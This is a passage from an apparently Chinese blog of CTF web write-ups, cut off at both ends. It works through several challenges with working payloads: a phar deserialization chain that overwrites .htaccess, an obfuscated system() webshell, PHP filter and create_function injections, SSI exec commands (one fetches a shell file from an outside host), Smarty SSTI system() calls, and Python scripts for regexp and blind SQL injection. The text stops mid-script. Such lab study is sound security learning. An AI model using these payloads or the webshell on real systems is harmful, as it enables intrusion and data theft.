admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00dwm2再向上传界面添加cookie user后，刷新页面。 user=4a4273909fdfabb4aa22b55264e7330e可以看到文件已经上传成功了。 要想方法传shell。但从源码中可以看到，由于.htaccess内容完全被控制，导致php文件无法正常解析。 if (!is_file($sandbox.'/.htaccess')){ file_put_contents($sandbox.'/.htaccess', 'lolololol, i control all'); } 其实看到这么多魔术方法应该就往反序列化方向考虑。 看一下File类。 有可控参数filename和filepath， 在view_detail函数中对filepath做了一些有关伪协议的过滤。 然后通过mime_content_type函数对文件类型进行检测，重点就在于这个函数通过_php_finfo_get_type间接调用了关键函数php_stream_open_wrapper_ex,导致此处可以触发phar反序列化。 思路就是构造pop链删除或重写.htaccess/干脆换一个目录。 class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this->filepath = $filepath; $this->filename = $filename; } public function view_detail(){ if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){ die(\"nonono~\"); } $mine = mime_content_type($this->filepath); $store_path = $this->open($this->filename, $this->filepath); $res['mine'] = $mine; $res['store_path'] = $store_path; return $res; } public function open($filename, $filepath){ $res = \"$filename is in $filepath\"; return $res; } function __destruct() { if (isset($this->checker)){ $this->checker->upload_file(); } } } 继续向下看代码，思考如何构建链。File类的析构函数中checker调用了本类不存在的函数upload_file(),这让人想到_ _ call()方法，而Profile类中正好存在可利用的_ _call，在call方法中$admin调用了open方法。 这是题目的open方法。这样看好像没什么出路了。 但是类中的admin是可控的，如果我们将admin定义为php中一个内置类的对象，且这个类有open函数，功能是删除或更改文件信息就能达到目的。如图，搜到了ZipArchive类。 参数：filename文件名，flags是打开文档的模式，这里的参数就选择这两个。 综上进行phar文件构造，脚本如下： &lt;?php class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this->filepath = $filepath; $this->filename = $filename; $this->checker = new Profile(); } } class Profile{ public $username; public $password; public $admin; function __construct() { $this->username = \"/var/www/html/sandbox/479bfbc13b06e3588906f74bae9507c9/.htaccess\"; $this->password = ZipArchive::OVERWRITE | ZipArchive::CREATE; $this->admin = new ZipArchive(); } } $a = new File('aa','aa'); @unlink(\"2.phar\"); $phar = new Phar(\"2.phar\"); $phar->startBuffering(); $phar->setStub(\"&lt;?php __HALT_COMPILER(); ?>\"); $phar->setMetadata($a); $phar->addFromString(\"test.txt\", \"test\"); $phar->stopBuffering(); ?> 先上传一个shell（因为每次访问upload都会重置.htaccess，为了使下面更改.htaccess操作生效）,check()里的黑名单用拼接形式绕过。 &lt;?php $a=\"syste\"; $b=\"m\"; $c=$a.$b; $d=$c($_REQUEST['a']); ?> //存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php 记录存储位置 上传phar文件，记录存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar 用php://filter/resource=phar://绕过伪协议过滤触发反序列化，执行对.htaccess的操作。 view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar 直接访问shell位置读取flag。 /sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag; [安洵杯 2019]easy_serialize_php考点：反序列化逃逸 分析源码 &lt;?php $function = @$_GET['f']; function filter($img){//filter方法将目标参数中的'php','flag','php5','php4','fl1g'替换为空。 $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } //替换和反序列很容易想到反序列化逃逸 if($_SESSION){ unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST);//存在变量覆盖漏洞，user、function可控 if(!$function){ echo '&lt;a href=\"index.php?f=highlight_file\">source_code&lt;/a>'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ //对img先sha1再base64 $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); //这只有个解base64的,那上面那种sha1加密过的肯定是不行了，得想办法把它替掉。 echo file_get_contents(base64_decode($userinfo['img'])); } 还给了个phpinfo的提示，在其中找到了文件d0g3_f1ag.php。 想法肯定是去控制img的值。 基础序列化 &lt;?php $_SESSION[\"user\"] = 'user'; $_SESSION['function'] = 'function'; $_SESSION['img'] = 'img'; echo serialize($_SESSION); ?> ---- 输出->a:3:{s:4:\"user\";s:4:\"user\";s:8:\"function\";s:8:\"function\";s:3:\"img\";s:3:\"img\";} 想要构造的值 &lt;?php $_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php echo serialize($_SESSION); ?> ----- 输出->a:1:{s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 构造->a:1:{\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 将构造的值赋给function。 a:3:{s:4:\"user\";s:4:\"user\";s:8:\"function\";s:46:\"a:1:{\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:3:\"img\";} filter替换后----> a:3:{s:4:\"user\"; s:4:\"\";s:8:\"function\";s:46:\"a:1:{\";--->双引号内28个字符，那这里需要7个flag s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} \";s:3:\"img\";s:3:\"img\";}--->丢掉 但问题来了，这正常应该有三个值，这里只有两个。所以重新进行构造： &lt;?php $_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';//d0g3_f1ag.php $_SESSION['dwm2'] = 'hhh'; echo serialize($_SESSION); ?> ---- 输出->a:2:{s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"dwm2\";s:3:\"hhh\";} 构造->a:2:{\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"dwm2\";s:3:\"hhh\";} 再赋给function,这样就可以成功读到。 a:3:{s:4:\"user\";s:28:\"flagflagflagflagflagflagflag\";s:8:\"function\";s:67:\"a:2:{\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"dwm2\";s:3:\"hhh\";}\";s:3:\"img\";s:3:\"img\";} 替换后---> a:3:{s:4:\"user\"; s:28:\"\";s:8:\"function\";s:67:\"a:2:{\"; s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"; s:4:\"dwm2\";s:3:\"hhh\";} \";s:3:\"img\";s:3:\"img\";}-->丢掉 payload GET:?f=show_image POST:_SESSION[user]=flagflagflagflagflagflagflag _SESSION[function]=a:2:{\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"dwm2\";s:3:\"hhh\";} 读到 flag in /d0g3_fllllllag payload GET:?f=show_image POST:_SESSION[user]=flagflagflagflagflagflagflag _SESSION[function]=a:2:{\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";s:4:\"dwm2\";s:3:\"hhh\";} 得到flag 之后看了其他人的wp，发现还有其他方法： 键名逃逸 payload _SESSION[flagphp]=;s:2:\"db\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} a:1:{s:7:\"\";s:49:\";s:2:\"db\"; s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";} \";}-->丢掉 也是一样的道理。 [GWCTF 2019]枯燥的抽奖考点：php伪随机数 题目首页给了一组字符串lb1MlXS13a 源码里看见check.php，访问一下看见源码。 &lt;?php #这不是抽奖程序的源代码！不许看！ header(\"Content-Type: text/html;charset=utf-8\"); session_start(); if(!isset($_SESSION['seed'])){ $_SESSION['seed']=rand(0,999999999); } mt_srand($_SESSION['seed']); $str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $str=''; $len1=20; for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \"&lt;p id='p1'>\".$str_show.\"&lt;/p>\"; if(isset($_POST['num'])){ if($_POST['num']===$str){x echo \"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>\"; } else{ echo \"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>\"; } } show_source(\"check.php\"); 看到mt_rand，伪随机数漏洞。 先把字母还原 a='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' b='lb1MlXS13a' c = a[::-1] length = len(b) res='' for i in range(len(b)): for j in range(len(a)): if b[i] == a[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(a)-1)+' ' break print(res) ------ 11 11 0 61 1 1 0 61 27 27 0 61 48 48 0 61 11 11 0 61 59 59 0 61 54 54 0 61 27 27 0 61 29 29 0 61 0 0 0 61 工具爆破一下得到seed：949630651 再通过seed还原完整字符串 &lt;?php mt_srand(\"949630651\"); $str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; $str=''; $len1=20; for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } echo $str; ?> ---- lb1MlXS13aqjyh1bbe1R 输入得到flag。 [BSidesCF 2020]Had a bad day考点：伪协议 进来是这样一个页面，点击按钮可以看猫猫或狗狗的照片。 当url输入引号时，会回显报错。发现include函数。而且句末拼接了.php。 扫后台得到 尝试伪协议读取 php://filter/read=convert.base64-encode/resource=flag没读到flag,那就先读index试试 &lt;?php $file = $_GET['category']; if(isset($file)) { if( strpos( $file, \"woofers\" ) !== false || strpos( $file, \"meowers\" ) !== false || strpos( $file, \"index\")){ include ($file . '.php'); } else{ echo \"Sorry, we currently only support woofers and meowers.\"; } } ?> 新学了个技巧，原来php://filter伪协议还能套一层 payload php://filter/read=convert.base64-encode/woofers/resource=flag [BJDCTF2020]EzPHP考点：各种PHP特性，create_function()代码注入 点进来是个威胁实时地图。 源代码发现hint,解base32:1nD3x.php 访问它给了源码。 &lt;?php highlight_file(__FILE__); error_reporting(0); $file = \"1nD3x.php\"; $shana = $_GET['shana']; $passwd = $_GET['passwd']; $arg = ''; $code = ''; echo \"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>\"; //url编码 if($_SERVER) { if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); } //换行符绕过 if (!preg_match('/http|https/i', $_GET['file'])) { if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br>\"; } } else die('fxck you! What do you want to do ?!'); //同时GET+POST传同一个参(preg_match只匹配字符，数组可以逃过检测) if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); } } //data:// if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>\"); //数组 if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){ extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br>\"; } else{ die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\"); } if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(\"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); } else { include \"flag.php\"; $code('', $arg); } ?> 好嘛，这一题里有一万个绕过。整理一下： ①整体上有对$_ SERVER和$_REQUEST的限制， 虽然做了很多过滤，但是$_SERVER[‘QUERY_STRING’]不解码url，可以用url编码绕过； $_REQUEST直接不能匹配英文字符，可是我们有许多get传参中需要。 但$_REQUEST存在解析顺序，按默认来说先GET,后POST;两个同时传，就可以用POST把GET覆盖掉。 如php.ini中所示： //php.ini ; This directive determines which super global arrays are registered when PHP ; starts up. G,P,C,E &amp;amp; S are abbreviations for the following respective super ; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty ; paid for the registration of these arrays and because ENV is not as commonly ; used as the others, ENV is not recommended on productions servers. You ; can still get access to the environment variables through getenv() should you ; need to. ; Default Value: \"EGPCS\" ; Development Value: \"GPCS\" ; Production Value: \"GPCS\"; ; http://php.net/variables-order variables_order = \"GPCS\" ; This directive determines which super global data (G,P &amp;amp; C) should be ; registered into the super global array REQUEST. If so, it also determines ; the order in which that data is registered. The values for this directive ; are specified in the same manner as the variables_order directive, ; EXCEPT one. Leaving this value empty will cause PHP to use the value set ; in the variables_order directive. It does not mean it will leave the super ; globals array REQUEST empty. ; Default Value: None ; Development Value: \"GP\" ; Production Value: \"GP\" ; http://php.net/request-order request_order = \"GP\" ②换行符%0A绕过’/^$/’ if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') payload ?debu=aqua_is_cute%0A post:debu=1 ③伪协议绕file_get_contents if (file_get_contents($file) !== 'debu_debu_aqua') payload ?file=data://text/plain,debu_debu_aqua post:file=1 ④数组绕sha1 if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ) payload ?shana[]=1&amp;passwd[]=2 ⑤create_function代码注入 本来以为是无参数RCE，但这过滤的也太多了。 if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { die(\"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); } else { include \"flag.php\"; $code('', $arg); create_function这个确实没见过，学学。 create_function：创建一个匿名函数。create_function内部会执行eval函数。 $lambda1=\"return ln($a)+ln($b)\"\"; create_function('$a,$b',$lambda_1); 等价于 function lambda1($a,$b){ return \"ln($a)+ln($b)\"; } 那么如果$lamdba_1=return $a+$b;}eval($_POST[‘cmd’];\\\\ 执行时就会变成，可以RCE了。 function lambda1($a,$b){ return $a+$b;} eval($_POST['cmd']);//} 正好里有个extract() 那就像这样构造： flag[code]=create_function&amp;flag[arg]=;}function();//然后开始看大师傅的wp，哎 我忽略了这个地方，代码里写了包含flag.php。 既然包含了，那不用去直接读flag.php也可以得到flag。 这时候就需要一个函数，可以输出所有变量的值：get_defined_vars() 那么结合上面所有的可以这样构造payload: ?debu=debu_is_cute%0A&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}var_dump(get_defined_vars());// post: debu=1 file=1 -->url编码后得到 %64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}var_dump(get_defined_vars());// 传入得到，…哦这flag还在另一个文件里 继续学习读文件的姿势。 虽然得到了一个新的文件，但我们依然可以用get_defined_vars读取变量的值。只要把rea1fl4g.php包含进来就可以达成目的。 由于include,单双引号, . 还有一些flag关键词都被过滤，用base64编码即可绕过。 require(base64_decode(cmVhMWZsNGcucGhw)); //rea1fl4g.php payload debu=debu_is_cute%0A&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// %64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%62%61%73%65%36%34_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// 相似的，还有很多种方法： 比如可以用异或： &lt;? //Author: 颖奇L'Amore //Blog: www.gem-love.com $flag = \"r e a 1 f l 4 g . p h p\"; $arr = explode(' ', $flag); foreach ($arr as $key => $value) { echo \"%\".dechex(ord($value)^0xff); } echo \"^\"; foreach ($arr as $key => $value) { echo \"%ff\"; } payload %64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff );var_dump(get_defined_vars());// 也可以用取反： &lt;? //Author: 颖奇L'Amore //Blog: www.gem-love.com $a = \"r e a 1 f l 4 g . p h p\"; $arr1 = explode(' ', $a); echo \"&lt;br>~(\"; foreach ($arr1 as $key => $value) { echo \"%\".bin2hex(~$value); } echo \")&lt;br>\"; payload ?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));var_dump(get_defined_vars());// 但是！以上都是原题中的做法！这道题过滤了^,异或用不得。而且即使你用取反读到了，哈哈没想到吧还是假flag。 方法一 利用require本地包含正解是require里套个编码过的伪协议。也就是用require()本地包含加伪协议读源码。 最终payload: ?debu=aqua_is_cute%0A&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=;}require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());// -->编码 ?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A&amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));// 方法二 define+fopen ()+fgets ()fopen()和fgets()都没被过滤，但$被ban了。这里直接用define定义了个常量，学到了学到了。 payload define(aaa,fopen(~(%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f),r))；while(!feof(aaa))var_dump(fgets(aaa));fclose(aaa);方法三 数组操作 flag[arg]=;}var_dump(require(end(pos(get_defined_vars()))));//&amp;flag[code]=create_function&amp;abc=php://filter/convert.base64-encode/resource=rea1fl4g.php post: abc=1 师傅的wp说的很清晰了。 同理，还有这种 rce=php://filter/read=convert.base64-encode/resource=rea1fl4g.php&amp;flag[arg]=;}require(get_defined_vars()[_GET][rce]);// 参考：https://www.gem-love.com/ctf/770.html [BJDCTF2020]EasySearch考点：vim泄露；爆破；SSI注入。 一个简单的登录页面，输入错误只会弹failed。 扫了下后台，vim泄露，访问得到源码。 &lt;?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\"Content-Type: text/html;charset=utf-8\"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo \"&lt;script>alert('[+] Welcome to manage system')&lt;/script>\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** &lt;h1>Hello,'.$_POST['username'].'&lt;/h1> *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; } else { echo \"&lt;script>alert('[!] Failed')&lt;/script>\"; }else { *** } *** ?> admin的值是6d0bc1，爆个破找个passwd出来。结果是2020666。 import hashlib import threading def run(): for i in range(999999999): if (hashlib.md5(str(i).encode())).hexdigest()[0:6]==\"6d0bc1\": print(i) break thread = threading.Thread(target=run) thread.start() 登录进来了，一开始以为啥都没有。结果这有个header的提示。那估计是头里有东西。 果然 Url_is_here: public/372fda1bdfbe9027365d54258d00222630c2af50.shtml 访问一下。再回头看这段源码。 这里实际上对username没有要求，并且它可控。诶, html+rce=ssi。 if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo \"&lt;script>alert('[+] Welcome to manage system')&lt;/script>\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** &lt;h1>Hello,'.$_POST['username'].'&lt;/h1> *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; 那么传入 username= passwd=2020666 再访问如下的url,rce成功。 找了找，在../下。 payload username=%3C%21--%23exec+cmd%3D%22cat%20../flag_990c66bf85a09c664f0b6741840499b2%22+--%3E&amp;password=2020666 SSI注入总结SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。 前提条件 1.开启SSI 2.WEB应用程序返回HTML界面时，嵌入用户输入的内容。 3.对用户输入没有有效过滤。 命令执行 &lt;!--#exec cmd=\"ls\" --> 脚本 &lt;!--#exec cmd=\"wget http://mysite.com/shell.txt | rename shell.txt shell.php\" --> 访问/设置服务器信息 更改错误消息输出： &lt;!--#config errmsg=\"File not found, informs users and password\"--> 显示当前文档的文件名： &lt;!--#echo var=\"DOCUMENT_NAME\" --> 显示虚拟路径和文件名： &lt;!--#echo var=\"DOCUMENT_URI\" --> 使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式： &lt;!--#config timefmt=\"A %B %d %Y %r\"--> 使用“ fsize”命令，可以打印所选文件的大小： &lt;!--#fsize file=\"ssi.shtml\" --> [CISCN2019 华东南赛区]Web11考点：smarty ssti ..这一整页英文..看着就头疼，但还好有个smarty的提示。 源代码看见，版本smarty3-&gt;ssti 各个参数里都尝试一下，找到xff中存在ssti。(他这页面估计也是在提示这里) payload X-Forwarded-For:{if phpinfo()}{/if} X-Forwarded-For:{if system(&quot;ls /&quot;)}{/if} X-Forwarded-For:{if system(&quot;cat /flag&quot;)}{/if} ) Smarty SSTI 利用方式常规利用方式 1.{literal} 标签 {literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。那么就可以构造,但此方法仅在php5中适用。 {literal &lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;}{/literal}2.{php}标签 官方文档 Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。 静态方法 1.通过self获取Smarty类再调用其静态方法实现文件读写（仅适用于旧版本 &lt;3.1.30(?)） Smarty类的getStreamVariable方法的代码如下： public function getStreamVariable($variable){ $_result = ''; $fp = fopen($variable, 'r+'); if ($fp) { while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) { $_result .= $current_line; } fclose($fp); return $_result; } $smarty = isset($this->smarty) ? $this->smarty : $this; if ($smarty->error_unassigned) { throw new SmartyException('Undefined stream variable \"' . $variable . '\"'); } else { return null; } } 方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法 payload {self::getStreamVariable(&quot;file:///etc/passwd&quot;)}2.{if} Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等 payload {if phpinfo()}{/if} 参考 https://www.freebuf.com/column/219913.html [NCTF2019]SQLi考点：regexp 注入 进来给了登录框和查询语句。 常规扫一波后台，发现robots.txt。 直接给了黑名单。 $black_list = \"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|&lt;|>|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\"; If $_POST['passwd'] === admin's password, Then you will get the flag; select * from users where username='' and passwd='' 下面就是构造语句查admin密码了。 虽然过滤了很多东西，但是regexp还在， 再用\\转义掉 ‘ ，用/**/绕空格 payload username=\\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00看一下报文有啥区别好写脚本。 脚本 import string import requests from urllib import parse passwd = '' string= string.ascii_lowercase + string.digits + '_' url = 'http://9ba5ab21-ccbe-498c-aa7f-398794a7df36.node3.buuoj.cn' for n in range(100): for m in string: data = { \"username\":\"\\\\\", \"passwd\":\"||/**/passwd/**/regexp/**/\\\"^{}\\\";{}\".format((passwd+m),parse.unquote('%00')) } res = requests.post(url,data=data) if 'welcome' in res.text: passwd += m print(m) break print(passwd) 直接post passwd 得到flag。 [CISCN2019 总决赛 Day2 Web1]Easyweb考点：文件泄露，盲注，php短标签 啊。。熟悉的界面 扫扫先 备份文件泄露 都试试，只有image.php &lt;?php include \"config.php\"; $id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\"; $path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\"; $id=addslashes($id); $path=addslashes($path); $id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id); $path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path); $result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\"); $row=mysqli_fetch_array($result,MYSQLI_ASSOC); $path=\"./\" . $row[\"path\"]; header(\"Content-Type: image/jpeg\"); readfile($path); 这和上一道题差不多，还是用\\转义，不过是多了个str_replace。后面就直接盲注。 exp import requests url = \"http://f1eec99b-3d95-4c68-91cb-f245f2684a39.node3.buuoj.cn/image.php?id=\\\\0&amp;path=\" payload1 = \"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23\" payload2 = \"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23\" payload3 = \"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23\" payload4 = \"or if(ascii(substr((select username from users),{0},1))>{1},1,0)%23\" result = \"\" def database(): payload1 = \"or if(ascii(substr((select database()),{0},1))>{1},1,0)%23\" for i in range(1,100): l = 1 r = 130 mid = (l + r)>>1 while(l&lt;r): payloads = payload1.format(i,mid) print(url+payloads) html = requests.get(url+payloads) if \"JFIF\" in html.text: l = mid +1 else: r = mid mid = (l + r)>>1 result+=chr(mid) print(result) return result def table_name(): table_name=\"\" payload2 = \"or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1))>{1},1,0)%23\" for i in range(1,100): l = 1 r = 130 mid = (l + r)>>1 while(l&lt;r): payloads = payload2.format(i,mid) print(url+payloads) html = requests.get(url+payloads) if \"JFIF\" in html.text: l = mid +1 else: r = mid mid = (l + r)>>1 table_name+=chr(mid) print(table_name) return table_name def column_name(): column_name=\"\" table_name = \"0x70617373776f7264\" payload3 = \"or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{0},1))>{1},1,0)%23\" for i in range(1,100): l = 1 r = 130 mid = (l + r)>>1 while(l&lt;r): payloads = payload3.format(i,mid) print(url+payloads) html = requests.get(url+payloads) if \"JFIF\" in html.text: l = mid +1 else: r = mid mid = (l + r)>>1 column_name+=chr(mid) print(column_name) return column_name def 